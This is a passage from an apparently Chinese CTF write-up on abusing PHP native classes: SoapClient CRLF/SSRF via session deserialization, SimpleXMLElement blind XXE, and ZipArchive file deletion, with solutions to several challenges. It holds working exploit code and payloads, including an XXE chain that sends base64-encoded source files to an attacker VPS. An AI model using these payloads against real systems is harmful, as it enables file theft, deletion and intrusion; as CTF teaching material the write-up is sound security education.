class="number">3</span>Dtcjr6nadpk3md7jbgioa6elfk4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure></div>

<p>这里这个POC就是利用CRLF伪造本地请求SSRF去访问flag.php，并将得到的flag结果保存在cookie为 <code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code> 的session中。</p>
<p>然后，我们就要想办法反序列化这个对象，但这里有没有反序列化点，那么我们怎么办呢？我们在题目源码中发现了session_start();，很明显，我们可以用session反序列化漏洞。但是如果想要利用session反序列化漏洞的话，我们必须要有 <code>ini_set()</code> 这个函数来更改 <code>session.serialize_handler</code> 的值，将session反序列化引擎修改为其他的引擎，本来应该使用ini_set()这个函数的，但是这个函数不接受数组，所以就不行了。于是我们就用session_start()函数来代替，即构造 <code>session_start(serialize_handler=php_serialize)</code> 就行了。我们可以利用题目中的 <code>call_user_func($_GET[&#39;f&#39;], $_POST);</code> 函数，传入GET：&#x2F;?f&#x3D;session_start、POST：serialize_handler&#x3D;php_serialize，实现 <code>session_start(serialize_handler=php_serialize)</code> 的调用来修改此页面的序列化引擎为php_serialize。</p>
<p>所以，我们第一次传值先注入上面POC生成的payload创建并得到我们的session：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t018b7826581aa6ec6b.png"
                      alt="img"
                ></p>
<p>此时，我们成功将我们php原生类SoapClient构造的payload传入了 <code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code> 的session中，当页面重新加载时，就会自动将其反序列化。但此时还不会触发SSRF，需要触发 <code>__call</code> 方法来造成SSRF，该方法在访问对象中一个不存在的方法时会被自动调用，所以单纯反序列化还不行，我们还需要访问该对象中一个不存在的方法，这里就用到了如下这段代码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br></pre></td></tr></table></figure></div>

<p>我们可以利用extract函数将变量b覆盖为call_user_func，这样，就成了：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(call_user_func, <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>));</span><br></pre></td></tr></table></figure></div>

<p>call_user_func()函数有一个特性，就是当只传入一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名。</p>
<p>这样也就是会访问我们构造的session对象中的welcome_to_the_lctf2018方法，而welcome_to_the_lctf2018方法不存在，就会触发 <code>__call</code> 方法，造成ssrf去访问flag.php。</p>
<p>所以我们第二次传参如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01228ea403908a653f.png"
                      alt="img"
                ></p>
<p>最后，我们第三次传参，用我们POC里面自己设置的cookie（<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>）去访问这个页面，<code>var_dump($_SESSION);</code> 会将 <code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code> 的这个session内容输出出来，即可得到flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t010c03084432767c8c.png"
                      alt="img"
                ></p>
<h2 id="使用-SimpleXMLElement-类进行-XXE"><a href="#使用-SimpleXMLElement-类进行-XXE" class="headerlink" title="使用 SimpleXMLElement 类进行 XXE"></a>使用 SimpleXMLElement 类进行 XXE</h2><p>SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。</p>
<h3 id="SimpleXMLElement-类"><a href="#SimpleXMLElement-类" class="headerlink" title="SimpleXMLElement 类"></a>SimpleXMLElement 类</h3><p>官方文档中对于SimpleXMLElement 类的构造方法 <code>SimpleXMLElement::__construct</code> 的定义如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01f512315ecae4f8e3.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t017279b3b019174cb6.png"
                      alt="img"
                ></p>
<p>可以看到通过设置第三个参数 data_is_url 为 <code>true</code>，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为<code>2</code>即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
<p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p>
<h3 id="读文件poc"><a href="#读文件poc" class="headerlink" title="读文件poc"></a>读文件poc</h3><p><strong>evil.xml</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE ANY[  </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://xxx.xxx.xxx.xxx/send.xml&quot;&gt;  </span><br><span class="line">%remote;  </span><br><span class="line">%all;  </span><br><span class="line">%send;  </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>send.xml</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx.xxx/send.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>send.php</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">file_put_contents(&quot;result.txt&quot;, $_GET[&#x27;file&#x27;]) ;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>恶意代码</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$x=new SimpleXMLElement(&quot;http://xxx.xxx.xxx.xxx/evil.xml&quot;,2,true);</span><br></pre></td></tr></table></figure></div>


<p>当然我们不止可以读文件，xxe能干的事我们也能干</p>
<h3 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h3><p><strong>[SUCTF 2018]Homework</strong></p>
<p>进入题目，随便注册一个账号，登录作业平台。看到一个 <code>calc</code> 计算器类的代码。有两个按钮，一个用于调用 <code>calc</code> 类实现两位数的四则运算。另一个用于上传文件，提交代码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t0188fbf9a452c1339a.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01b7f5dc0366f78470.png"
                      alt="img"
                ></p>
<p><code>calc</code> 计算器类的代码为：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">calc</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct__</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">calc</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">calc</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$method</span>,<span class="variable">$args2</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$args1</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$args1</span>);</span><br><span class="line">        <span class="variable">$args2</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$args2</span>);</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">                <span class="variable">$method</span>=<span class="string">&quot;+&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">                <span class="variable">$method</span>=<span class="string">&quot;-&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">                <span class="variable">$method</span>=<span class="string">&quot;*&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">                <span class="variable">$method</span>=<span class="string">&quot;/&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;invalid input&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$Expression</span>=<span class="variable">$args1</span>.<span class="variable">$method</span>.<span class="variable">$args2</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;\$r=<span class="subst">$Expression</span>;&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Calculation results:&quot;</span>.<span class="variable">$r</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>我们点击calc按钮，计算2+2&#x3D;4，我们观察url处的参数，再结合<code>calc</code>计算器类的代码可知module为调用的类，args为类的构造方法的参数：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t01e0798943d4956330.png"
                      alt="img"
                ></p>
<p>所以我们可以通过这种形式调用PHP中的内置类。这里我们通过调用 SimpleXMLElement 这个内置类来构造 XXE。</p>
<p>首先，我们在vps（47.xxx.xxx.72）上构造如下evil.xml、send.xml和send.php这三个文件。</p>
<p>evil.xml：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % remote SYSTEM <span class="string">&quot;http://47.xxx.xxx.72/send.xml&quot;</span>&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></div>

<p>send.xml：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=index.php&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % all <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://47.xxx.xxx.72/send.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>send.php：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;result.txt&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>然后在url中构造如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">/show.php?module=SimpleXMLElement&amp;args[]=http://<span class="number">47.</span>xxx.xxx<span class="number">.72</span>/evil.xml&amp;args[]=<span class="number">2</span>&amp;args[]=true</span><br></pre></td></tr></table></figure></div>

<p>这样目标主机就能先加载我们vps上的evil.xml，再加载send.xml。</p>
<p>如下图所示，成功将网站的源码以base64编码的形式读取并带出到result.txt中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t015f31fafcb7a08e1b.png"
                      alt="img"
                ></p>
<p>后续解题过程就不写了。</p>
<h2 id="使用-ZipArchive-类来删除文件"><a href="#使用-ZipArchive-类来删除文件" class="headerlink" title="使用 ZipArchive 类来删除文件"></a>使用 ZipArchive 类来删除文件</h2><h3 id="ZipArchive-类"><a href="#ZipArchive-类" class="headerlink" title="ZipArchive 类"></a>ZipArchive 类</h3><p>PHP ZipArchive类是PHP的一个原生类，它是在PHP 5.20之后引入的。ZipArchive类可以对文件进行压缩与解压缩处理。</p>
<p>下面列举几个常见的类方法：</p>
<ul>
<li><a href="https://www.php.net/manual/zh/ziparchive.addemptydir.php"><code>ZipArchive::addEmptyDir</code></a>：添加一个新的文件目录</li>
<li><a href="https://www.php.net/manual/zh/ziparchive.addfile.php"><code>ZipArchive::addFile</code></a>：将文件添加到指定zip压缩包中</li>
<li><a href="https://www.php.net/manual/zh/ziparchive.addfromstring.php"><code>ZipArchive::addFromString</code></a>：添加新的文件同时将内容添加进去</li>
<li><a href="https://www.php.net/manual/zh/ziparchive.close.php"><code>ZipArchive::close</code></a>：关闭ziparchive</li>
<li><a href="https://www.php.net/manual/zh/ziparchive.extractto.php"><code>ZipArchive::extractTo</code></a>：将压缩包解压</li>
<li><a href="https://www.php.net/manual/zh/ziparchive.open.php"><code>ZipArchive::open</code></a>：打开一个zip压缩包</li>
<li><a href="https://www.php.net/manual/zh/ziparchive.deleteindex.php"><code>ZipArchive::deleteIndex</code></a>：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件</li>
<li><a href="https://www.php.net/manual/zh/ziparchive.deletename.php"><code>ZipArchive::deleteName</code></a>：删除压缩包中的某一个文件名称，同时也将文件删除</li>
<li>……</li>
</ul>
<p>我们来重点看看 <code>ZipArchive::open</code> 方法：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">ZipArchive</span>::<span class="title function_ invoke__">open</span>(<span class="keyword">string</span> <span class="variable">$filename</span>, <span class="keyword">int</span> <span class="variable">$flags</span>=<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<p>该方法用来打开一个新的或现有的zip存档以进行读取，写入或修改。</p>
<ul>
<li>filename：要打开的ZIP存档的文件名。</li>
<li>flags：用于打开档案的模式。有以下几种模式：<ul>
<li><code>ZipArchive::OVERWRITE</code>：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</li>
<li><code>ZipArchive::CREATE</code>：如果不存在则创建一个zip压缩包。</li>
<li><code>ZipArchive::RDONLY</code>：只读模式打开压缩包。</li>
<li><code>ZipArchive::EXCL</code>：如果压缩包已经存在，则出错。</li>
<li><code>ZipArchive::CHECKCONS</code>：对压缩包执行额外的一致性检查，如果失败则显示错误。</li>
</ul>
</li>
</ul>
<p>注意，如果设置flags参数的值为 <code>ZipArchive::OVERWRITE</code> 的话，可以把指定文件删除。这里我们跟进方法可以看到const OVERWRITE &#x3D; 8，也就是将OVERWRITE定义为了常量8，我们在调用时也可以直接将flags赋值为8。</p>
<p>也就是说我们可以利用ZipArchive原生类调用open方法删除目标主机上的文件。下面我们来看一道CTF题目。</p>
<h3 id="删除文件poc"><a href="#删除文件poc" class="headerlink" title="删除文件poc"></a>删除文件poc</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new ZipArchive();</span><br><span class="line">$a-&gt;open(&quot;file&quot;, ZipArchive::OVERWRITE); // ZipArchive::CREATE也可以用8代替</span><br></pre></td></tr></table></figure></div>



<h3 id="读取文件poc"><a href="#读取文件poc" class="headerlink" title="读取文件poc"></a>读取文件poc</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$f = &quot;flag&quot;;</span><br><span class="line">$zip=new ZipArchive();</span><br><span class="line">$zip-&gt;open(&quot;a.zip&quot;, ZipArchive::CREATE);</span><br><span class="line">$zip-&gt;addFile($f);</span><br><span class="line">$zip-&gt;close();</span><br><span class="line">$zip-&gt;open(&quot;a.zip&quot;);</span><br><span class="line">echo $zip-&gt;getFromName($f);</span><br><span class="line">$zip-&gt;close();</span><br></pre></td></tr></table></figure></div>



<h3 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h3><p><strong>梦里花开牡丹亭</strong></p>
<p>进入题目，给出源码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;    <span class="comment">// 当waf.txt没读取成功时才能得到flag</span></span><br><span class="line">            <span class="title function_ invoke__">shell</span>(<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>.<span class="string">&quot;.php&quot;</span>);    <span class="comment">// filename=php://filter/read=convert.base64-encode/resource=shell</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]!==<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>开头包含了shell.php，我们可以构造反序列化POC来读取shell.php：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;    <span class="comment">// admin</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;   </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="title class_">Game</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;password = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;register = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;file = <span class="keyword">new</span> <span class="title class_">Open</span>();</span><br><span class="line"><span class="variable">$poc</span>-&gt;filename = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=shell&quot;</span>;</span><br><span class="line"><span class="variable">$poc</span>-&gt;content = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br></pre></td></tr></table></figure></div>

<p>执行POC得到payload：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NTQ6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1zaGVsbCI7czo3OiJjb250ZW50IjtzOjQ6ImxzIC8iO30=</span><br></pre></td></tr></table></figure></div>

<p>执行payload读取到shell.php的源码base64编码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/t013c0280c9dee343bc.png"
                      alt="img"
                ></p>
<p>解码得到shell.php的源码：</p>
